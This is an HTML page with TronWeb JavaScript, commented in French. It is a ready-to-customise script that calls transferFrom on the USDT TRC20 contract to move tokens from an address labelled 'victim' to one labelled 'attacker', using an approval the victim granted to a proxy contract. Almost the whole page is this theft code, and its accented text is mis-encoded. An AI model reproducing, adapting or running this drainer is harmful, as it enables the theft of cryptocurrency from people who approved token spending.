<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>D√©clenchement transferFrom TRC20</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
  <h2>Ex√©cuter transferFrom via ApproveProxy</h2>
  <button id="transferBtn">Ex√©cuter transferFrom</button>

  <script>
    // ‚ö†Ô∏è A PERSONNALISER : Adresse TRON de la victime (a approuv√© le proxy)
    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T";

    // ‚ö†Ô∏è A PERSONNALISER : Adresse TRON qui re√ßoit les USDT
    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41";

    // ‚ö†Ô∏è Adresse du token TRC20 USDT (fixe, officiel)
    const tokenContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";

    // ‚ö†Ô∏è Adresse du contrat proxy approuv√© (pour info, pas utilis√© ici directement)
    const proxyContractAddress = "TAo4rwUGQovSD9F3qSeecUAsJsyzLetWpH";

    async function runTransferFrom() {
      if (!window.tronWeb || !window.tronWeb.ready) {
        alert("‚ùå Veuillez ouvrir dans le navigateur TronLink et vous connecter !");
        return;
      }

      const tronWeb = window.tronWeb;

      try {
        // üì¶ Chargement du contrat USDT
        const tokenContract = await tronWeb.contract().at(tokenContractAddress);

        // ‚ö†Ô∏è A PERSONNALISER : montant √† transf√©rer (en SUN, 1 USDT = 1_000_000 SUN)
        const amount = 1 * 1_000_000;

        // üîÅ Appel √† transferFrom depuis le compte connect√©
        const tx = await tokenContract.transferFrom(victim, attacker, amount).send({
          feeLimit: 1_000_000
        });

        alert("‚úÖ Transaction envoy√©e : " + tx);
      } catch (error) {
        console.error("‚ùå Erreur transferFrom :", error);
        alert("Erreur : " + (error?.message || error));
      }
    }

    // üéØ Clic bouton
    document.getElementById("transferBtn").addEventListener("click", runTransferFrom);
  </script>
</body>
</html>
